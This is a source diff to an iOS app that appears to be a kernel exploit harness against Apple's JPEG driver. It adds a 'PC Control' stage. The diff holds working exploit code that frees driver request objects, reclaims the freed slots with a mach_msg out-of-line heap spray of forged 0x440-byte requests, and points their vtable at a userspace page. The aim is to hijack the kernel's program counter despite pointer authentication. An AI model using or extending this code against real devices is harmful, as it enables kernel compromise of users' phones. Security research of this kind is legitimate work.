@@ -34,6 +34,7 @@
 #import "ViewController.h"
 #import <IOSurface/IOSurfaceRef.h>
 #import <mach/mach.h>
+#import <sys/mman.h>
 
 // IOKit function declarations (not in public iOS headers)
 typedef mach_port_t io_object_t;
@@ -123,6 +124,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 @property (nonatomic, strong) UIButton *panicButton;
 @property (nonatomic, strong) UIButton *reclaimButton;
 @property (nonatomic, strong) UIButton *triggerButton;
+@property (nonatomic, strong) UIButton *pcControlButton;
 @property (nonatomic, strong) UILabel *statusLabel;
 @property (nonatomic, assign) BOOL running;
 @end
@@ -163,6 +165,16 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
     [self.triggerButton addTarget:self action:@selector(triggerPressed) forControlEvents:UIControlEventTouchUpInside];
 
+    // PC Control button
+    self.pcControlButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    [self.pcControlButton setTitle:@"PC Control" forState:UIControlStateNormal];
+    self.pcControlButton.titleLabel.font = [UIFont boldSystemFontOfSize:16];
+    [self.pcControlButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
+    self.pcControlButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.1 blue:0.1 alpha:1.0];
+    self.pcControlButton.layer.cornerRadius = 12;
+    self.pcControlButton.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.pcControlButton addTarget:self action:@selector(pcControlPressed) forControlEvents:UIControlEventTouchUpInside];
+
     // Status label
     self.statusLabel = [[UILabel alloc] init];
     self.statusLabel.text = @"";
@@ -185,6 +197,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [self.view addSubview:self.panicButton];
     [self.view addSubview:self.reclaimButton];
     [self.view addSubview:self.triggerButton];
+    [self.view addSubview:self.pcControlButton];
     [self.view addSubview:self.statusLabel];
     [self.view addSubview:self.logView];
 
@@ -205,7 +218,11 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         [self.triggerButton.leadingAnchor constraintEqualToAnchor:self.view.centerXAnchor constant:8],
         [self.triggerButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-30],
         [self.triggerButton.heightAnchor constraintEqualToConstant:50],
-        [self.logView.topAnchor constraintEqualToAnchor:self.reclaimButton.bottomAnchor constant:12],
+        [self.pcControlButton.topAnchor constraintEqualToAnchor:self.reclaimButton.bottomAnchor constant:12],
+        [self.pcControlButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:30],
+        [self.pcControlButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-30],
+        [self.pcControlButton.heightAnchor constraintEqualToConstant:50],
+        [self.logView.topAnchor constraintEqualToAnchor:self.pcControlButton.bottomAnchor constant:12],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
@@ -271,6 +288,25 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 
     [self setStatus:@"Path 3B running..."];
     [self triggerPath3B];
+}
+
+- (void)pcControlPressed {
+    if (self.running) return;
+
+    [UIView animateWithDuration:0.1 animations:^{
+        self.pcControlButton.transform = CGAffineTransformMakeScale(0.9, 0.9);
+    } completion:^(BOOL finished) {
+        [UIView animateWithDuration:0.1 animations:^{
+            self.pcControlButton.transform = CGAffineTransformIdentity;
+        }];
+    }];
+
+    [UIView animateWithDuration:0.3 animations:^{
+        self.logView.alpha = 1.0;
+    }];
+
+    [self setStatus:@"PC Control test..."];
+    [self pcControlTest];
 }
 
 #pragma mark - Status
@@ -730,7 +766,313 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                  sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
     }
-    free(payload);
+    // Note: caller owns payload — do NOT free here
+}
+
+#pragma mark - PC Control (fake vtable)
+
+// JpegRequest layout (0x440 = 1088 bytes):
+//   +0x00: vtable/task pointer ← PC control point (AUTDA → LDR→BLRAA)
+//   +0x78: queue link node (embedded)
+//   +0x80: self-pointer (set by queue_io_gated)
+//   +0x310: flags byte (bit0=progressive)
+//
+// Virtual call path in finish_io_gated:
+//   LDR  x16, [xN]               ; load vtable from req+0
+//   MOV  x17, xN; MOVK x17,#0xcda1,lsl#48
+//   AUTDA x16, x17               ; authenticate vtable (Data key A)
+//   LDR  x8, [x16, #0x28]!       ; load fn ptr from vtable[5]
+//   MOV  x17, x9; MOVK x17,#0x3a87,lsl#48
+//   BLRAA x8, x17                ; authenticated call (Instruction key A)
+
+// Build a fake JpegRequest payload (0x440 bytes).
+// fakeVtableAddr: value placed at offset 0 (vtable pointer loaded by LDR x16,[xN])
+//   - Stage 1: 0x0 (NULL) → AUTDA(NULL) → fault or corrupted addr
+//   - Stage 2: 0x200 (small) → AUTDA(0x200) → LDR from 0x228 → fault
+//   - Stage 3: userspace mmap addr → LDR target PC from mmap → BLRAA
+// Returns malloc'd buffer (caller must free).
+- (uint8_t *)buildFakeRequest:(uint64_t)fakeVtableAddr {
+    const size_t size = 0x440;
+    uint8_t *payload = calloc(1, size);
+    if (!payload) return NULL;
+
+    // Fill with 'P' pattern (0x50) for identification in crash registers
+    memset(payload, 0x50, size);
+
+    // Offset 0x00: vtable/task pointer → loaded by LDR x16, [xN]
+    *(uint64_t *)(payload + 0x00) = fakeVtableAddr;
+
+    // Zero out dangerous fields that cause early crashes before vtable+0x28:
+    memset(payload + 0x78, 0, 16);   // queue link node (0x78-0x87) → no chain walk
+    memset(payload + 0x80, 0, 8);    // self-pointer (0x80) → no stale deref
+    payload[0x310] = 0;              // flags byte → not progressive
+
+    return payload;
+}
+
+// Spray a pre-built payload via OOL mach_msg descriptors.
+// Each message copies 'size' bytes of 'payload' into a kalloc allocation.
+- (void)sprayOOLWithPayload:(uint8_t *)payload size:(uint32_t)size
+                      count:(int)count port:(mach_port_t)port {
+    for (int i = 0; i < count; i++) {
+        struct {
+            mach_msg_header_t          header;
+            mach_msg_body_t            body;
+            mach_msg_ool_descriptor_t  ool;
+        } msg = {0};
+        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0)
+                               | MACH_MSGH_BITS_COMPLEX;
+        msg.header.msgh_size = sizeof(msg);
+        msg.header.msgh_remote_port = port;
+        msg.body.msgh_descriptor_count = 1;
+        msg.ool.address = payload;
+        msg.ool.size = size;
+        msg.ool.deallocate = FALSE;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+        mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                 sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+    }
+}
+
+// PC Control test — 3 progressive stages.
+//
+// Stage 1 (NULL vtable): offset 0 = 0x0
+//   LDR x16,[xN] → x16=0 → AUTDA(0,ctx) → permission fault or corrupted addr
+//   If PANIC at LDR x16 with FAULT addr 0x0 → we control offset 0!
+//
+// Stage 2 (small vtable): offset 0 = 0x100
+//   LDR x16,[xN] → x16=0x100 → AUTDA(0x100,ctx) → LDR x8,[x16,#0x28]!
+//   If PANIC at LDR x8 with FAULT addr 0x128 → we bypass AUTDA!
+//
+// Stage 3 (full fake vtable): offset 0 = userspace fake vtable addr
+//   If PANIC at BLRAA with target PC → full PC control!
+//
+// Each stage: victim frees JpegRequests → spray reclaims with payload → trigger
+- (void)pcControlTest {
+    if (self.running) {
+        [self log:@"Already running"];
+        return;
+    }
+    self.running = YES;
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self log:@"=== PC Control Test (A15 PAC: AUTDA 0xcda1 / BLRAA 0x3a87) ==="];
+        [self log:@"JpegRequest: 0x440 bytes, vtable at offset 0"];
+        [self log:@"Target: *(*(req+0)+0x28)() in finish_io_gated"];
+
+        io_service_t svc = [self findJPEGService];
+        if (!svc) {
+            [self log:@"Service not found"];
+            self.running = NO;
+            return;
+        }
+
+        BOOL healthy = [self checkDriverHealth:svc];
+        [self log:@"Driver: %@", healthy ? @"OK" : @"BROKEN"];
+        if (!healthy) {
+            IOObjectRelease(svc);
+            self.running = NO;
+            return;
+        }
+
+        const uint32_t W = 2048, H = 2048;
+        NSData *jpegData = [self createTestJPEG:W height:H];
+        IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
+        IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
+        if (!srcSurf || !dstSurf) {
+            [self log:@"Surface creation failed"];
+            IOObjectRelease(svc);
+            if (srcSurf) CFRelease(srcSurf);
+            if (dstSurf) CFRelease(dstSurf);
+            self.running = NO;
+            return;
+        }
+        uint32_t srcID = IOSurfaceGetID(srcSurf);
+        uint32_t dstID = IOSurfaceGetID(dstSurf);
+
+        // mmap a page for the fake vtable (Stage 3)
+        // arm64e userspace: mmap usually allocates in 0x100000000+ range
+        vm_size_t pageSize = 0;
+        host_page_size(mach_host_self(), &pageSize);
+        void *fakeVtableUserspace = mmap(NULL, pageSize,
+            PROT_READ | PROT_WRITE,
+            MAP_PRIVATE | MAP_ANON, -1, 0);
+        uint64_t fakeVtableAddr = (uint64_t)fakeVtableUserspace;
+        [self log:@"Fake vtable userspace addr: 0x%llx (page=%zuKB)",
+            fakeVtableAddr, pageSize/1024];
+
+        if (fakeVtableUserspace == MAP_FAILED) {
+            fakeVtableAddr = 0xDEAD00000000ULL; // recognizable fallback
+        } else {
+            // Setup fake vtable: offset 0x28 = 0x4141414141414141 (recognizable PC)
+            memset(fakeVtableUserspace, 0, pageSize);
+            // Slot 0 (vtable+0x00): another pointer back to (fakeVtableUserspace+0x100)
+            // just to keep the chain valid if needed
+            *(uint64_t *)(fakeVtableUserspace + 0x00) = fakeVtableAddr + 0x100;
+            // Slot 5 (vtable+0x28): target PC = 0x4141414141414141
+            *(uint64_t *)(fakeVtableUserspace + 0x28) = 0x4141414141414141ULL;
+        }
+
+        // OOL spray port
+        mach_port_t sprayPort = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
+        mach_port_insert_right(mach_task_self(), sprayPort, sprayPort,
+                               MACH_MSG_TYPE_MAKE_SEND);
+
+        // ============================================================
+        // Stage 1: NULL vtable (offset 0 = 0x0)
+        // ============================================================
+        [self log:@""];
+        [self log:@"--- Stage 1: offset 0 = NULL (0x0) ---"];
+        [self log:@"Expect: AUTDA(NULL,ctx) → fault at LDR or corrupted addr"];
+
+        uint8_t *payload1 = [self buildFakeRequest:0x0];
+        if (payload1) {
+            // Victim: free JpegRequests (20 iters × 5 reqs = 100 freed slots)
+            for (int v = 0; v < 20 && self.running; v++) {
+                io_connect_t victim = [self openUC:svc];
+                if (!victim) continue;
+                [self submitAsyncRequests:victim srcID:srcID dstID:dstID
+                    width:W height:H count:5 tokenBase:0x5100 + v];
+                IOServiceClose(victim);
+            }
+
+            // Spray: reclaim freed slots with payload (offset 0 = NULL)
+            [self sprayOOLWithPayload:payload1 size:0x440 count:200 port:sprayPort];
+            [self log:@"Stage 1: sprayed 200 × 0x440 (offset 0 = NULL)"];
+
+            // Trigger: submit new requests to activate begin_io_gated
+            // which dequeues stale entries → finish_io_gated → vtable+0x28
+            for (int t = 0; t < 3 && self.running; t++) {
+                io_connect_t trigger = [self openUC:svc];
+                if (!trigger) continue;
+                [self submitAsyncRequests:trigger srcID:srcID dstID:dstID
+                    width:W height:H count:3 tokenBase:0x5A00 + t];
+                IOServiceClose(trigger);
+            }
+
+            [self log:@"Stage 1 done — check for panic"];
+            free(payload1);
+            usleep(500000); // wait for HW drain
+        }
+
+        // Check driver health after stage 1
+        healthy = [self checkDriverHealth:svc];
+        [self log:@"Driver after S1: %@", healthy ? @"OK" : @"BROKEN"];
+        [self log:@"If panic with PC in AppleJPEGDriver → S1: controlled offset 0!"];
+
+        if (!healthy || !self.running) {
+            [self log:@"Device likely panicked — check crash log for PC value"];
+            self.running = NO;
+            mach_port_destroy(mach_task_self(), sprayPort);
+            CFRelease(srcSurf); CFRelease(dstSurf);
+            IOObjectRelease(svc);
+            if (fakeVtableUserspace != MAP_FAILED) munmap(fakeVtableUserspace, pageSize);
+            return;
+        }
+        usleep(500000);
+
+        // ============================================================
+        // Stage 2: Small vtable (offset 0 = 0x200)
+        // ============================================================
+        [self log:@""];
+        [self log:@"--- Stage 2: offset 0 = 0x200 (small address) ---"];
+        [self log:@"Expect: AUTDA(0x200,ctx) → LDR x8,[0x228] → fault at vtable+0x28 load"];
+
+        // Use a kernel heap-like address so AUTDA doesn't zero it completely
+        // 0x200 is a safe small address that will fault predictably at +0x28
+        uint8_t *payload2 = [self buildFakeRequest:0x200];
+        if (payload2) {
+            for (int v = 0; v < 20 && self.running; v++) {
+                io_connect_t victim = [self openUC:svc];
+                if (!victim) continue;
+                [self submitAsyncRequests:victim srcID:srcID dstID:dstID
+                    width:W height:H count:5 tokenBase:0x5200 + v];
+                IOServiceClose(victim);
+            }
+
+            [self sprayOOLWithPayload:payload2 size:0x440 count:200 port:sprayPort];
+            [self log:@"Stage 2: sprayed 200 × 0x440 (offset 0 = 0x200)"];
+
+            for (int t = 0; t < 3 && self.running; t++) {
+                io_connect_t trigger = [self openUC:svc];
+                if (!trigger) continue;
+                [self submitAsyncRequests:trigger srcID:srcID dstID:dstID
+                    width:W height:H count:3 tokenBase:0x5B00 + t];
+                IOServiceClose(trigger);
+            }
+
+            [self log:@"Stage 2 done — check for panic"];
+            free(payload2);
+            usleep(500000);
+        }
+
+        healthy = [self checkDriverHealth:svc];
+        [self log:@"Driver after S2: %@", healthy ? @"OK" : @"BROKEN"];
+        [self log:@"If panic with FAULT addr ~0x228 → S2: bypassed AUTDA!"];
+
+        if (!healthy || !self.running) {
+            [self log:@"Device likely panicked — check crash log for PC value"];
+            self.running = NO;
+            mach_port_destroy(mach_task_self(), sprayPort);
+            CFRelease(srcSurf); CFRelease(dstSurf);
+            IOObjectRelease(svc);
+            if (fakeVtableUserspace != MAP_FAILED) munmap(fakeVtableUserspace, pageSize);
+            return;
+        }
+        usleep(500000);
+
+        // ============================================================
+        // Stage 3: Full fake vtable (offset 0 = userspace address)
+        // ============================================================
+        [self log:@""];
+        [self log:@"--- Stage 3: offset 0 = userspace fake vtable (0x%llx) ---", fakeVtableAddr];
+        [self log:@"Fake vtable[5] = 0x4141414141414141 (target PC)"];
+        [self log:@"Expect: AUTDA → LDR target PC → BLRAA to 0x41414141..."];
+
+        uint8_t *payload3 = [self buildFakeRequest:fakeVtableAddr];
+        if (payload3) {
+            for (int v = 0; v < 20 && self.running; v++) {
+                io_connect_t victim = [self openUC:svc];
+                if (!victim) continue;
+                [self submitAsyncRequests:victim srcID:srcID dstID:dstID
+                    width:W height:H count:5 tokenBase:0x5300 + v];
+                IOServiceClose(victim);
+            }
+
+            [self sprayOOLWithPayload:payload3 size:0x440 count:200 port:sprayPort];
+            [self log:@"Stage 3: sprayed 200 × 0x440 (offset 0 = 0x%llx)", fakeVtableAddr];
+
+            for (int t = 0; t < 3 && self.running; t++) {
+                io_connect_t trigger = [self openUC:svc];
+                if (!trigger) continue;
+                [self submitAsyncRequests:trigger srcID:srcID dstID:dstID
+                    width:W height:H count:3 tokenBase:0x5C00 + t];
+                IOServiceClose(trigger);
+            }
+
+            [self log:@"Stage 3 done — check for panic"];
+            free(payload3);
+            usleep(500000);
+        }
+
+        healthy = [self checkDriverHealth:svc];
+        [self log:@"Driver after S3: %@", healthy ? @"OK" : @"BROKEN"];
+        [self log:@"If panic at PC=0x4141414141414141 → FULL PC CONTROL!"];
+
+        // Cleanup
+        mach_port_destroy(mach_task_self(), sprayPort);
+        CFRelease(srcSurf);
+        CFRelease(dstSurf);
+        IOObjectRelease(svc);
+        if (fakeVtableUserspace != MAP_FAILED) munmap(fakeVtableUserspace, pageSize);
+
+        [self log:@""];
+        [self log:@"=== PC Control Test Complete ==="];
+        [self log:@"If no panic: PAC is strict (AUTDA/BLRAA faults prevent PC control)"];
+        [self log:@"If panic with distinctive addr: check crash log for stage & PC"];
+        self.running = NO;
+    });
 }
 
 - (void)uafCharacterize {
